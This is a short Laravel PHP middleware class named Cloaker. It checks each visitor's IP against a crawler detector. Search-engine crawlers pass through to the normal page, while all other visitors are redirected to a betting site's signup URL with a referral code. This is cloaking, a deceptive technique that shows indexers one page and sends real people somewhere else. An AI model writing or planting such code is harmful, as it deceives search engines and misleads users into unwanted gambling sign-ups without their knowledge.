<?php

declare(strict_types=1);

namespace App\Http\Middleware;

use App\Contracts\CrawlerDetector;
use App\ValueObjects\Http\Ip;
use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class Cloaker
{

    /**
     * @param  CrawlerDetector  $detector
     */
    public function __construct(
        private readonly CrawlerDetector $detector
    )
    {
    }

    /**
     * Handle an incoming request.
     *
     * @param  Closure(Request): (Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {
        $ip = Ip::make($request->ip());

        if ($this->detector->match($ip)) {
            return $next($request);
        }

        return redirect('https://betfe.app/?cadastro=1&l=7yn54');
    }
}
